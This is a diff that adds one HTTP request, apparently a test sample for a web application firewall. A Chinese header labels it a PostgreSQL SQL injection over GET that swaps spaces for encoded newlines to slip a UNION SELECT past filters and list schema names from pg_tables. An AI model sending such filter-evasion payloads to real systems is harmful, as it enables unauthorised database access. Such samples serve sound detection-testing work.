@@ -1,0 +1,9 @@
+# SQL注入_GET_postgresql _普通注入(空白符替换绕过)-06506369
+# 攻击者基于union查询使用空白符替换进行绕过，将"UNION%0aselect%0aschemaname%0aFROM%0apg_tables"语句注入到 SQL 查询参数中，从系统表pg_tables查询所有模式名称。
+GET /?id=1%250aUNION%250aselect%250aschemaname%250aFROM%250apg_tables&bid=hd_tag_m8mv23xo HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv23xo
+RM-PRO-Token: a593945b55b98df1548e1284494c4b7d
+RM-PRO-Time: 1742808351725
+User-Agent: curl/7.83.1
+
